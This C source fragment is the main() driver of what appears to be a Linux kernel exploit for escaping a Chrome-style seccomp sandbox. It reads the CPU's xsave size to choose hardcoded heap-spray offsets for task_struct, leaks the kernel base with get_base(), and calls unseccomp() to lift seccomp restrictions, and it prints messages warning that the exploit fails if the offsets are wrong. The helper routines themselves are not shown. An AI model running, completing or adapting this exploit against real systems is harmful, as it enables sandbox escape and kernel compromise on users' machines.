
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int _IONBF ;
 unsigned long get_base () ;
 int install_mock_chrome_sandbox () ;
 int native_cpuid (int*,int*,int*,int*) ;
 int printf (char*) ;
 int pthread_attr_init (int *) ;
 scalar_t__ pthread_attr_setstacksize (int *,int) ;
 int setvbuf (int ,int *,int ,int ) ;
 int spray_offset ;
 int srand (int ) ;
 int stdout ;
 int thread_attr ;
 int time (int *) ;
 int unseccomp () ;

int main() {

  install_mock_chrome_sandbox();

  setvbuf(stdout, ((void*)0), _IONBF, 0);
  srand(time(((void*)0)));


  pthread_attr_init(&thread_attr);
  if(pthread_attr_setstacksize(&thread_attr, 0x10000)) {
    printf("set stack size error\n");
    return 0;
  }


  int eax,ebx,ecx,edx;
  eax=0xd;
  ebx = ecx = edx = 0;
  native_cpuid(&eax, &ebx, &ecx, &edx);
  int xsave_size = ebx;

  if(xsave_size == 0x340) {
    spray_offset = 0x55dd00;
    printf("for spray assuming task struct size is 5952\n");
  }
  else if(xsave_size == 0x440) {
    spray_offset = 0x5448c0;
    printf("for spray assuming task struct size is 6208\n");
  }
  else {
    printf("unknown xsave size... exiting since I don't know have the offsets hardcoded for that task save\n");
    return 0;
  }
  printf("check in /sys/kernel/slab/task_struct/object_size to make sure this is right\n");
  printf("If it's wrong the exploit will fail\n");

  unsigned long base = get_base();
  if (base == -1) {
    return -1;
  }

  unseccomp();
  return 0;

}
